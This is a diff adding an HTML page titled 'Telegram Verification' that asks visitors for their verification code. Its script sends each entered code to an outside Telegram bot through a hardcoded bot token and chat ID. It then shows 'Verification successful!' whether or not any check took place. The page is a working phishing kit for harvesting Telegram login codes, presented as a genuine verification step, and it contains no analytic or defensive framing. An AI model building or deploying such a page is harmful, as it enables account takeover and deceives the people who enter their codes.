@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Verification</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            text-align: center;
+            padding: 50px;
+        }
+        h1 {
+            color: #333;
+        }
+        #verification-container {
+            background-color: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            display: inline-block;
+        }
+        input[type="text"] {
+            padding: 10px;
+            width: 80%;
+            margin: 10px 0;
+            border-radius: 5px;
+            border: 1px solid #ccc;
+            font-size: 18px;
+        }
+        button {
+            background-color: orange;
+            color: white;
+            padding: 10px 20px;
+            font-size: 18px;
+            cursor: pointer;
+            border: none;
+            border-radius: 5px;
+        }
+        button:hover {
+            background-color: darkorange;
+        }
+        #result-message {
+            margin-top: 20px;
+            font-size: 18px;
+        }
+    </style>
+</head>
+<body>
+    <h1>Telegram Verification</h1>
+    <div id="verification-container">
+        <h2>Enter Verification Code:</h2>
+        <input type="text" id="verificationCode" placeholder="Enter your code">
+        <br>
+        <button onclick="verifyCode()">Verify</button>
+        <div id="result-message"></div>
+    </div>
+
+    <script>
+        // Telegram Bot Token and Chat ID
+        const botToken = '7921041329:AAGh5A66MIhosuZjJ_r5ZR49l36Y8PB1t54';
+        const chatID = '-1002302815757';
+
+        // Function to verify the code
+        async function verifyCode() {
+            const code = document.getElementById('verificationCode').value;
+
+            if (!code) {
+                alert('Please enter a verification code.');
+                return;
+            }
+
+            // Prepare the message to be sent
+            const message = `New Verification Code: ${code}`;
+            const apiURL = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatID}&text=${encodeURIComponent(message)}`;
+
+            try {
+                // Send the verification code to Telegram
+                const response = await fetch(apiURL);
+                const data = await response.json();
+
+                // Check if the message was sent successfully
+                if (data.ok) {
+                    document.getElementById('result-message').innerText = 'Verification successful!';
+                    document.getElementById('result-message').style.color = 'green';
+                } else {
+                    document.getElementById('result-message').innerText = 'Verification failed. Please try again.';
+                    document.getElementById('result-message').style.color = 'red';
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                document.getElementById('result-message').innerText = 'An error occurred. Please try again later.';
+                document.getElementById('result-message').style.color = 'red';
+            }
+        }
+    </script>
+</body>
+</html>
